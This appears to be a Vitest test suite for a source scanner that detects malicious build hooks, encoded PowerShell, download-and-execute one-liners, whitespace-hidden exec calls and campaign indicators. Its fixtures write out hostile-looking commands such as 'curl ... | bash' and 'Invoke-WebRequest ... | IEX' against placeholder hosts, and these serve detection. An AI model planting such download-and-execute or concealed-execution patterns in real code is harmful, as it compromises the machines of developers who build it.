import { describe, expect, it } from "vitest";
import {
  DevShieldPreflightError,
  devShieldPublicEvidence,
  enforceDevShieldPreflight,
  scanDevShieldSource,
  type DevShieldSourceFile,
} from "./devshield-preflight";

const app = (): DevShieldSourceFile[] => [
  { path: "package.json", content: JSON.stringify({
    dependencies: { next: "15.5.20" }, scripts: { build: "next build" },
  }) },
  { path: "src/app/page.tsx", content: "export default function Page() { return <div>Safe</div>; }" },
  { path: "src/app/layout.tsx", content: "export default function Layout({children}:any){return <html><body>{children}</body></html>}" },
];

const withFile = (path: string, content: string) => [...app(), { path, content }];
const ids = (files: DevShieldSourceFile[]) =>
  scanDevShieldSource(files).findings.map(f => f.id);

describe("DevShield BuildRx static source preflight", () => {
  it("reports a safe source snapshot without claiming malware clearance", () => {
    const report = enforceDevShieldPreflight(app());
    expect(report.complete).toBe(true);
    expect(report.status).toBe("no-indicators-observed");
    expect(report.checkedFiles).toBe(3);
    expect(report.findings).toEqual([]);
  });

  it("rejects Visual Studio malicious pre-build and MSBuild Exec hooks", () => {
    const findings = ids(withFile("app.csproj",
      '<Project><PreBuildEvent>powershell.exe -EncodedCommand Zg==</PreBuildEvent><Exec Command="pwsh -File bad.ps1"/></Project>'));
    expect(findings).toContain("msbuild-event-script-execution");
    expect(findings).toContain("msbuild-exec-interpreter");
    expect(findings).toContain("powershell-encoded-command");
    expect(() => enforceDevShieldPreflight(withFile("app.csproj",
      "<PreBuildEvent>powershell -nop</PreBuildEvent>"))).toThrow(DevShieldPreflightError);
  });

  it("detects Dr.Web campaign indicators as clues without source leakage", () => {
    const report = scanDevShieldSource(withFile("config.ts",
      'const url = "https://muckcoding.com"; const privateToken = "do-not-export";'));
    expect(report.findings.map(x => x.id)).toContain("drweb-2026-campaign-ioc");
    expect(JSON.stringify(devShieldPublicEvidence(report))).not.toContain("do-not-export");
    expect(JSON.stringify(report)).not.toContain("do-not-export");
  });

  it("detects encoded PowerShell download-and-execute", () => {
    const found = ids(withFile("install.ps1",
      "powershell.exe -enc Zg==\nInvoke-WebRequest https://example.invalid/a | IEX\n"));
    expect(found).toContain("powershell-encoded-command");
    expect(found).toContain("powershell-download-and-execute");
  });

  it("detects Python and Go execution hidden by whitespace", () => {
    const report = scanDevShieldSource([
      ...withFile("scan.py", "print('ok')" + " ".repeat(140) + "exec(payload)\n"),
      { path: "scan.go", content: 'package main\n' + " ".repeat(180) + 'exec.Command("powershell", "-nop")\n' },
    ]);
    expect(report.findings.map(f => f.id)).toEqual(expect.arrayContaining([
      "python-whitespace-concealed-execution", "go-whitespace-concealed-operation", "go-powershell-execution",
    ]));
  });

  it("detects decoded Python execution", () => {
    expect(ids(withFile("tool.py", 'exec(base64.b64decode("eA=="))'))).toContain(
      "python-decoded-payload-execution");
  });

  it("rejects npm lifecycle hooks and suspicious scripts BEFORE provider access", () => {
    const files = app();
    files[0] = { path: "package.json", content: JSON.stringify({
      dependencies: { next: "15.5.20" },
      scripts: { postinstall: "node safe.js", build: "curl https://example.invalid/install.sh | bash" },
    }) };
    expect(ids(files)).toEqual(expect.arrayContaining([
      "npm-install-lifecycle-hook", "npm-executable-script-pattern",
    ]));
    expect(() => enforceDevShieldPreflight(files)).toThrow(DevShieldPreflightError);
  });

  it("does not flag an IOC mentioned in Markdown documentation", () => {
    const report = enforceDevShieldPreflight(withFile("README.md",
      "We discuss muckcoding.com and PowerShell in an educational post."));
    expect(report.status).toBe("no-indicators-observed");
    expect(report.skippedNonExecutableFiles).toBe(1);
  });

  it("fails closed on invalid/duplicate paths, malformed scripts and binary data", () => {
    const invalid = [
      [...app(), { path: "../escape.js", content: "ok" }],
      [...app(), { path: "SRC/APP/PAGE.TSX", content: "collision" }],
      [...app(), { path: ".env.production", content: "SECRET=1" }],
      [...app(), { path: "payload.exe", content: "payload" }],
      [...app(), { path: "weird.js", content: "a\0b" }],
      [{ path: "package.json", content: '{"scripts":not-json}' }],
      [{ path: "package.json", content: '{"scripts":{"build":123}}' }],
      [],
    ];
    for (const files of invalid) {
      const result = scanDevShieldSource(files);
      expect(result.complete).toBe(false);
      expect(result.status).toBe("incomplete");
      expect(result.errors.length).toBeGreaterThan(0);
      expect(() => enforceDevShieldPreflight(files)).toThrow(DevShieldPreflightError);
    }
  });

  it("fails closed on oversized source, never silently claiming a pass", () => {
    const report = scanDevShieldSource(withFile("large.js", "x".repeat(1_500_001)));
    expect(report.status).toBe("incomplete");
    expect(report.complete).toBe(false);
  });

  it("produces only bounded source-free public evidence", () => {
    const output = devShieldPublicEvidence(scanDevShieldSource(
      withFile("setup.ps1", "powershell.exe -enc abc\nPASSWORD=do-not-print")));
    expect(Object.keys(output)).not.toContain("files");
    expect(JSON.stringify(output)).not.toContain("PASSWORD=do-not-print");
    expect(output.findings.length).toBeLessThanOrEqual(20);
  });
});
